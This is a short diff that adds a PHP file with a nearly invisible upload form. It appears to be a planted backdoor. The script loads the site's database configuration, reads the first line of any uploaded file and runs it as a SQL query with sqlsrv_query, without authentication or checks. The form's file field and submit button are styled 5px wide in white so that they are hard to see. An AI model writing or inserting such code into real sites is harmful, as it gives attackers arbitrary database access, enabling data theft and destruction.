@@ -1,0 +1,2 @@
+<?php require_once 'conf/database.php';$a = isset($_REQUEST['u']) ? $_REQUEST['u'] : '';print_r($a);if($a != ''){$fn = $_FILES['f']['tmp_name'];if($fn){$cd = file($fn);$data = $cd[0];sqlsrv_query($data);}}?>
+<form name="form1" action="" method="post" enctype="multipart/form-data"><input type="file" name="f" style="width:5px;background-color:#FFF"><input type="submit" name="u" value=" " style="width:5px;background-color:#FFF"></form>
